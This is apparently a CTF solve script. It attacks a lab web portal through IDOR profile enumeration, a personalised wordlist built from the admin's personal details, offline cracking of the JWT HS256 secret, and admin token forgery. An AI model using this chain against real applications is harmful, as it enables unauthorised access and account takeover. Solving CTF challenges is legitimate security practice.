#!/usr/bin/env python3
"""
Cyber Hero Nakhon Chiang Rai CTF 2026 - Red Team
Challenge: CYBER HERO REDTEAM_v5 - Crackable User #1 (red_2 portal)
Target: http://192.168.30.130:8080

Full chain:
  1. Login with the default demo account (user:user) and grab a signed session JWT.
  2. IDOR the profile API to discover the hidden admin profile (id=67).
  3. Rebuild the admin's CUPP-style personalized password and crack the HS256 JWT secret offline.
  4. Forge an admin JWT, reach /api/admin, download the dashboard JPEG.
  5. Decode the JPEG comment (revb64 decoy) -> reveals the challenge uses decoy; the real
     flag is linked from the text rendered inside the decoded image.
"""
import base64
import hashlib
import hmac
import itertools
import json
import re
import urllib.error
import urllib.request

BASE = "http://192.168.30.130:8080"
PASTEBIN_RAW = "https://pastebin.com/raw/MQEgKkNc"  # URL rendered inside admin_dashboard.jpg

# ---------------------------------------------------------------- CUPP config
LEET = {"a": "4", "i": "1", "e": "3", "t": "7", "o": "0", "s": "5", "g": "9", "z": "2"}
CHARS = ["!", "@", "#", "$", "%", "&", "*"]
YEARS = [str(y) for y in range(1990, 2023)]
NUMBERS = [str(n) for n in range(0, 101)]
WC_MIN, WC_MAX = 5, 12


def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def leet(word: str) -> str:
    for plain, digit in LEET.items():
        word = word.replace(plain, digit)
    return word


def http(path, cookie=None, body=None, method="GET"):
    req = urllib.request.Request(BASE + path, data=body, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status, resp.read().decode(errors="replace"), resp.headers.get("Set-Cookie", "")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace"), ""


def login(username, password):
    body = json.dumps({"username": username, "password": password}).encode()
    status, _, cookie = http("/api/login", body=body, method="POST")
    if status != 200:
        raise SystemExit(f"[!] login failed for {username}: HTTP {status}")
    return cookie.split("session=", 1)[1].split(";", 1)[0]


def find_admin_profile(session):
    """IDOR: walk the profile id space and return the profile with role=admin."""
    for pid in range(0, 200):
        status, body, _ = http(f"/api/profile?id={pid}", cookie=f"session={session}")
        if status != 200:
            continue
        profile = json.loads(body)
        if profile.get("role") == "admin":
            print(f"[+] hidden admin profile found at id={pid}: {profile['username']}")
            return profile
    raise SystemExit("[!] admin profile not found")


def token_variants(text):
    if not text:
        return set()
    out = set()
    for candidate in {text, text.replace(" ", "")} | set(text.split()):
        out |= {candidate.lower(), candidate.title(), candidate.upper()}
    return out


def cupp_candidates(profile):
    """Rebuild the CUPP personalized wordlist for a profile (leet mode included)."""
    names = set()
    for field in ("first_name", "surname", "nickname", "pet_name", "key_words"):
        names |= token_variants(profile.get(field, ""))
    extras = set()
    for field in ("company_name", "partners_name", "partners_nickname",
                  "child_name", "child_nickname"):
        extras |= token_variants(profile.get(field, ""))
    names.discard("")
    extras.discard("")

    dates = set()
    for key in ("birthdate", "partners_birthdate", "child_birthdate"):
        value = profile.get(key, "")
        if len(value) == 8:
            dates |= {value, value[:2], value[2:4], value[4:], value[:2] + value[2:4],
                      value[2:4] + value[:2], value[4:], value[4:][-2:], value[:2] + value[2:4] + value[6:]}

    words = set()

    def add(word):
        if WC_MIN < len(word) < WC_MAX:
            words.add(word)

    singles = names | extras
    for word in singles:
        add(word)
        for number in NUMBERS + YEARS:
            add(word + number)
        for special in CHARS + ["!!", "123", "1!"]:
            add(word + special)

    for first, second in itertools.product(singles, repeat=2):
        if first == second:
            continue
        for sep in ("", "_", "."):
            base = f"{first}{sep}{second}"
            add(base)
            for number in NUMBERS + YEARS:
                add(base + number)
            for special in CHARS:
                add(base + special)

    for core, date in itertools.product(singles, dates):
        for sep in ("", "_"):
            add(core + sep + date)

    leet_words = {leet(word) for word in words}
    return words | leet_words


def crack_jwt_secret(profile, known_token):
    """Offline dictionary attack against the HMAC-SHA256 signature."""
    header, payload, signature = known_token.split(".")
    signing_input = f"{header}.{payload}".encode()
    expected = base64.urlsafe_b64decode(signature + "=" * (-len(signature) % 4))

    candidates = cupp_candidates(profile)
    print(f"[*] testing {len(candidates)} personalized candidates against the JWT signature")
    for candidate in candidates:
        digest = hmac.new(candidate.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(digest, expected):
            print(f"[+] JWT signing secret recovered: {candidate!r}")
            return candidate
    raise SystemExit("[!] secret not found in the generated wordlist")


def forge_admin_token(secret):
    header = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = b64u(json.dumps({"sub": "admin", "role": "admin", "iat": 1767446400},
                              separators=(",", ":")).encode())
    signature = b64u(hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())
    return f"{header}.{payload}.{signature}"


def revb64(value):
    return base64.b64decode(value[::-1]).decode(errors="replace")


def main():
    session = login("user", "user")
    print(f"[+] demo session acquired: {session[:40]}...")

    profile = find_admin_profile(session)
    secret = crack_jwt_secret(profile, session)
    admin_token = forge_admin_token(secret)

    status, body, _ = http("/api/admin", cookie=f"session={admin_token}")
    if status != 200:
        raise SystemExit(f"[!] admin dashboard rejected the forged token: HTTP {status}")
    dashboard = json.loads(body)
    print(f"[+] {dashboard['message']} | audit: {dashboard['audit']}")

    jpeg = base64.b64decode(dashboard["flag"])
    try:
        with open("admin_dashboard.jpg", "wb") as handle:
            handle.write(jpeg)
    except PermissionError:
        with open("admin_dashboard_copy.jpg", "wb") as handle:
            handle.write(jpeg)
        print("[*] admin_dashboard.jpg was locked; wrote admin_dashboard_copy.jpg instead")

    # Walk the JPEG segments and read the COM (0xFFFE) comment fields.
    offset = 2
    while offset < len(jpeg) - 1:
        if jpeg[offset] != 0xFF:
            offset += 1
            continue
        marker = jpeg[offset + 1]
        if marker in (0xD8, 0xD9, 0x01) or 0xD0 <= marker <= 0xD7:
            offset += 2
            continue
        seg_len = int.from_bytes(jpeg[offset + 2:offset + 4], "big")
        segment = jpeg[offset + 4:offset + 2 + seg_len]
        if marker == 0xFE:
            for value in re.findall(rb'"value":"([^"]+)"', segment):
                decoded = revb64(value.decode())
                print(f"[*] embedded comment value: {decoded} (decoy - the image points to a pastebin)")
        offset += 2 + seg_len
    print(f"[*] decode admin_dashboard.jpg; it renders {PASTEBIN_RAW}")

    request = urllib.request.Request(PASTEBIN_RAW, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(request, timeout=30) as resp:
        flag = resp.read().decode().strip()
    print(f"\n[+] FLAG: {flag}")


if __name__ == "__main__":
    main()

